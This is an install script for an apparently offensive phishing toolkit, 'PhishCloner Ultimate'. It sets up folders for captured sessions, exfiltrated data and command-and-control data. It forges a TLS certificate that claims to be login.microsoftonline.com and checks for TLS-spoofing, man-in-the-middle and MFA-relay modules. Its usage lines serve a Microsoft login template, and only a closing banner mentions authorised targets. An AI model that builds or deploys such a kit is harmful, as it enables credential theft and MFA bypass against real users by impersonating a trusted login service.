#!/usr/bin/env bash
# 🏴‍☠️ PhishCloner Ultimate — Setup Script
# Signé Ghost1o1

set -e

GOLD="\033[38;5;220m"
CYAN="\033[38;5;39m"
RED="\033[38;5;196m"
GREEN="\033[38;5;46m"
RESET="\033[0m"
BOLD="\033[1m"

echo -e "${GOLD}${BOLD}"
cat << "EOF"
    ▓██▓▒░       ░▒▓██▓
     ▓█▓▒░ ░▒▓██▓▒░ ░▒▓█    ╔══════════════════════════════════╗
      █▒░ ░▓██▓▒░ ░▒▓█      ║  🏴‍☠️  PHISHCLONER ULTIMATE   🏴‍☠️  ║
      ▓█▒░ ░▒░░░░░ ░▒▓█      ║         SETUP v1.0.0            ║
       █▒░ ░▓██▓▒░ ░▒▓█      ║      Signé Ghost1o1             ║
       ▓█▒░ ░▒██▓▒░ ░▒██      ╚══════════════════════════════════╝
        █▓▒░ ░░░ ░▒██▓
        ░▒██▓▒░ ░▒██▓▒░
          ░▒▓██▓▒░ ░▒▓██▓
EOF
echo -e "${RESET}"

# Detect platform
if [ -f /etc/os-release ]; then
    . /etc/os-release
    PLATFORM=$ID
elif [ -f /System/Library/CoreServices/SystemVersion.plist ]; then
    PLATFORM="macos"
else
    PLATFORM="unknown"
fi

echo -e "${CYAN}[*] Platform detected: $PLATFORM${RESET}"
echo -e "${CYAN}[*] Python version: $(python3 --version 2>&1)${RESET}"

# 1. System dependencies
echo -e "${GOLD}[1/6] Installing system dependencies...${RESET}"
case "$PLATFORM" in
    kali|debian|ubuntu)
        DEBIAN_FRONTEND=noninteractive apt-get install -y \
            python3 python3-pip python3-venv \
            openssl libssl-dev libffi-dev \
            libxml2-dev libxslt1-dev \
            libpango-1.0-0 libpangoft2-1.0-0 \
            libcairo2 libgdk-pixbuf-2.0-0 \
            zlib1g-dev libjpeg-dev \
            build-essential git curl wget 2>&1 | tail -3
        ;;
    *)
        echo -e "${CYAN}[*] Skipping system packages (use Docker if needed)${RESET}"
        ;;
esac

# 2. Python venv
echo -e "${GOLD}[2/6] Creating Python virtual environment...${RESET}"
if [ ! -d "venv" ]; then
    python3 -m venv venv
fi
# shellcheck disable=SC1091
source venv/bin/activate
pip install --upgrade pip setuptools wheel 2>&1 | tail -2

# 3. Python dependencies
echo -e "${GOLD}[3/6] Installing Python dependencies...${RESET}"
pip install -r requirements.txt 2>&1 | tail -3

# 4. Create directories
echo -e "${GOLD}[4/6] Creating directory structure...${RESET}"
for dir in data data/email_lists data/domain_lists \
           phish_sessions phish_screenshots phish_exfil \
           c2_data logs build dist; do
    mkdir -p "$dir"
done

# 5. SSL certs
echo -e "${GOLD}[5/6] Generating TLS certificates...${RESET}"
if [ ! -f "certs/phishcloner-ca.pem" ]; then
    mkdir -p certs
    # Generate self-signed CA
    openssl req -x509 -newkey rsa:4096 -keyout certs/phishcloner-ca-key.pem \
        -out certs/phishcloner-ca.pem -days 3650 -nodes \
        -subj "/C=US/O=GhostNet Security/CN=PhishCloner Root CA" 2>&1 | tail -1

    # Generate server cert signed by CA
    openssl req -newkey rsa:2048 -keyout certs/phishcloner-key.pem \
        -out certs/phishcloner-csr.pem -nodes \
        -subj "/C=US/O=GhostNet Security/CN=login.microsoftonline.com" 2>&1 | tail -1

    openssl x509 -req -in certs/phishcloner-csr.pem \
        -CA certs/phishcloner-ca.pem -CAkey certs/phishcloner-ca-key.pem \
        -CAcreateserial -out certs/phishcloner-cert.pem -days 365 2>&1 | tail -1
fi

# 6. Verify
echo -e "${GOLD}[6/6] Verifying installation...${RESET}"
python3 -c "
import sys
print('   Python:', sys.version.split()[0])

# Test critical imports
try:
    import aiohttp, requests, flask, cryptography
    print('   ✅ aiohttp, flask, cryptography loaded')
except ImportError as e:
    print(f'   ❌ Missing dep: {e}')

try:
    from engine import TLSSpoofer, MITMProxy, MFARelay
    print('   ✅ Engine modules loaded')
except ImportError as e:
    print(f'   ❌ Engine: {e}')
"

echo ""
echo -e "${GOLD}${BOLD}═══════════════════════════════════════════════════════${RESET}"
echo -e "${GREEN}${BOLD}  ✅ PhishCloner Ultimate v1.0.0 installed${RESET}"
echo -e "${GOLD}${BOLD}═══════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${CYAN}Try it:${RESET}"
echo -e "   ${BOLD}source venv/bin/activate${RESET}"
echo -e "   ${BOLD}python3 phishcloner.py --help${RESET}"
echo -e "   ${BOLD}python3 phishcloner.py serve --template microsoft --port 8443${RESET}"
echo ""
echo -e "${RED}⚠️  USE ONLY ON AUTHORIZED TARGETS ⚠️${RESET}"
echo ""
echo -e "${CYAN}Signé Ghost1o1 🏴‍☠️${RESET}"
